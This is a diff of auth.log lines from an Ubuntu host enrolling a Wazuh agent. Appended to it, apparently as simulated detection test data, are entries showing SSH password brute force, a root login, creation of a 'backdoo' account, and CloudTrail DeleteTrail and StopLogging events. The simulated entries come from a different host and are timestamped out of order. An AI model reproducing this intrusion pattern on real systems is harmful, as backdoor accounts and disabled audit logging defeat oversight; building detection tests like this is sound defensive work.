+Mar 27 17:37:43 ip-172-31-73-237 sudo:   ubuntu : TTY=pts/0 ; PWD=/home/ubuntu ; USER=root ; COMMAND=/var/ossec/bin/agent-auth -m 50.16.170.225
+Mar 27 17:37:43 ip-172-31-73-237 sudo: pam_unix(sudo:session): session opened for user root(uid=0) by ubuntu(uid=1000)
+Mar 27 17:37:43 ip-172-31-73-237 sudo: pam_unix(sudo:session): session closed for user root
+Mar 27 17:38:07 ip-172-31-73-237 sudo:   ubuntu : TTY=pts/0 ; PWD=/home/ubuntu ; USER=root ; COMMAND=/usr/bin/systemctl start wazuh-agent
+Mar 27 17:38:07 ip-172-31-73-237 sudo: pam_unix(sudo:session): session opened for user root(uid=0) by ubuntu(uid=1000)
+Mar 27 17:38:13 ip-172-31-73-237 sudo: pam_unix(sudo:session): session closed for user root
+Mar 27 17:38:13 ip-172-31-73-237 sudo:   ubuntu : TTY=pts/0 ; PWD=/home/ubuntu ; USER=root ; COMMAND=/usr/bin/systemctl enable wazuh-agent
+Mar 27 17:38:13 ip-172-31-73-237 sudo: pam_unix(sudo:session): session opened for user root(uid=0) by ubuntu(uid=1000)
+Mar 27 17:38:13 ip-172-31-73-237 sudo: pam_unix(sudo:session): session closed for user root
+Mar 27 17:38:18 ip-172-31-73-237 sudo:   ubuntu : TTY=pts/0 ; PWD=/home/ubuntu ; USER=root ; COMMAND=/usr/bin/systemctl status wazuh-agent
+Mar 27 17:38:18 ip-172-31-73-237 sudo: pam_unix(sudo:session): session opened for user root(uid=0) by ubuntu(uid=1000)
+Mar 27 17:38:21 ip-172-31-73-237 sudo: pam_unix(sudo:session): session closed for user root
+Mar 27 17:48:23 ip-172-31-73-237 sshd[7319]: error: kex_exchange_identification: Connection closed by remote host
+Mar 27 17:48:23 ip-172-31-73-237 sshd[7319]: Connection closed by 172.31.69.183 port 35808
+Mar 27 17:50:26 ip-172-31-73-237 sudo:   ubuntu : TTY=pts/0 ; PWD=/home/ubuntu ; USER=root ; COMMAND=/usr/bin/cat /var/log/auth.log
+Mar 27 17:50:26 ip-172-31-73-237 sudo: pam_unix(sudo:session): session opened for user root(uid=0) by ubuntu(uid=1000)
+Mar 27 17:50:26 ip-172-31-73-237 sudo: pam_unix(sudo:session): session closed for user root
+Mar 27 17:55:24 ip-172-31-73-237 sshd[942]: pam_unix(sshd:session): session closed for user ubuntu
+Mar 27 17:55:24 ip-172-31-73-237 systemd-logind[461]: Session 1 logged out. Waiting for processes to exit.
+Mar 27 17:55:24 ip-172-31-73-237 systemd-logind[461]: Removed session 1.
+Mar 27 18:17:01 ip-172-31-73-237 CRON[7384]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Mar 27 18:17:01 ip-172-31-73-237 CRON[7384]: pam_unix(cron:session): session closed for user root
+Mar 27 18:34:09 ip-172-31-73-237 sshd[7418]: Accepted publickey for ubuntu from 106.205.179.69 port 4978 ssh2: RSA SHA256:T/DaFfLw15KqPfLmT2M4JmYu+B0kJxrCoPh4SRG0tCg
+Mar 27 18:34:09 ip-172-31-73-237 sshd[7418]: pam_unix(sshd:session): session opened for user ubuntu(uid=1000) by (uid=0)
+Mar 27 18:34:09 ip-172-31-73-237 systemd-logind[461]: New session 5 of user ubuntu.
+Mar 27 18:34:09 ip-172-31-73-237 systemd: pam_unix(systemd-user:session): session opened for user ubuntu(uid=1000) by (uid=0)
+Mar 27 18:35:21 ip-172-31-73-237 sshd[7526]: error: kex_exchange_identification: Connection closed by remote host
+Mar 27 18:35:21 ip-172-31-73-237 sshd[7526]: Connection closed by 172.31.69.183 port 57772
+Mar 27 18:35:58 ip-172-31-73-237 sudo:   ubuntu : TTY=pts/0 ; PWD=/home/ubuntu ; USER=root ; COMMAND=/usr/bin/cat /var/log/auth.log
+Mar 27 18:35:58 ip-172-31-73-237 sudo: pam_unix(sudo:session): session opened for user root(uid=0) by ubuntu(uid=1000)
+Mar 27 10:15:30 ip-172-31-31-226 sshd[1234]: Failed password for invalid user admin from 203.0.113.45 port 22 ssh2
+Mar 27 10:15:31 ip-172-31-31-226 sshd[1235]: Failed password for root from 198.51.100.67 port 22 ssh2
+Mar 27 10:15:32 ip-172-31-31-226 sshd[1236]: Failed password for ubuntu from 203.0.113.45 port 22 ssh2
+Mar 27 10:15:33 ip-172-31-31-226 sshd[1237]: Failed password for admin from 198.51.100.67 port 22 ssh2
+Mar 27 10:15:34 ip-172-31-31-226 sshd[1238]: Failed password for root from 203.0.113.45 port 22 ssh2
+Mar 27 10:15:35 ip-172-31-31-226 sshd[1239]: Accepted password for root from 203.0.113.45 port 22 ssh2
+Mar 27 10:15:36 ip-172-31-31-226 sshd[1240]: session opened for user root by (uid=0)
+Mar 27 10:15:37 ip-172-31-31-226 useradd[1241]: new user: backdoo
+* {"eventName": "DeleteTrail", "sourceIPAddress": "203.0.113.45", "userIdentity": {"userName": "attacker"}, "eventTime": "2026-03-27T10:15:00Z"}
+{"eventName": "StopLogging", "sourceIPAddress": "198.51.100.67", "userIdentity": {"userName": "root"}, "eventTime": "2026-03-27T10:16:00Z"}
